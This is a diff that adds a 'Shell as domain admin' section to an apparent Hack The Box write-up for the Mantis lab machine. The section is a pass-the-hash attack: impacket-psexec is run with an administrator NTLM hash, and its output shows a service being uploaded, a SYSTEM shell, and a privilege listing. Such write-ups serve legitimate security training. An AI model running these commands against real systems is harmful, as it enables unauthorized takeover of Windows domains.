@@ -489,5 +489,61 @@ SMB         10.129.17.20    445    MANTIS           [+] htb.local\administrator:
 ```
 The administrator is pwned!
 
+## Shell as domain admin
+```python
+impacket-psexec htb.local/Administrator@MANTIS -hashes ':22140219fd9432e584a355e54b28ecbb'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on MANTIS.....
+[*] Found writable share ADMIN$
+[*] Uploading file cROAFVGM.exe
+[*] Opening SVCManager on MANTIS.....
+[*] Creating service eTgP on MANTIS.....
+[*] Starting service eTgP.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami 
+nt authority\system
+
+C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Enabled 
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled 
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
+SeTimeZonePrivilege             Change the time zone                      Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
+
+C:\Windows\system32> 
+```
+
 
 
